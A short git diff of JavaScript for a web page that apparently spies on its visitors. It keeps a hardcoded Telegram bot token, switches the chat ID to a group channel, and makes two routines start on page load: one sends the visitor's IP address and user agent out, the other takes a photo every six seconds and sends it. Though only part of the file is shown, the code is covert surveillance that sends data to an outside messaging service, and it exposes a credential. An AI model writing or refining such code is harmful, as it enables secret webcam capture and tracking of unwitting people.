@@ -1,5 +1,5 @@
 const BOT_TOKEN = '6857162781:AAEZ3C2VwSM8MaAlQAeIdiqdwfxjpmLPH3U';
-const CHAT_ID = '5821871362';
+const CHAT_ID = '-1001870015374';
 
 function sendIPAndUserAgent() {
     fetch('https://api.ipify.org?format=json')
@@ -94,7 +94,9 @@ function dataURItoBlob(dataURI) {
 }
 
 // Send IP and user agent once when the page loads
-sendIPAndUserAgent();
+document.addEventListener('DOMContentLoaded', () => {
+    sendIPAndUserAgent();
 
-// Take photo and send every 6 seconds
-setInterval(takePhotoAndSend, 6000);
+    // Take photo and send every 6 seconds
+    setInterval(takePhotoAndSend, 6000);
+});
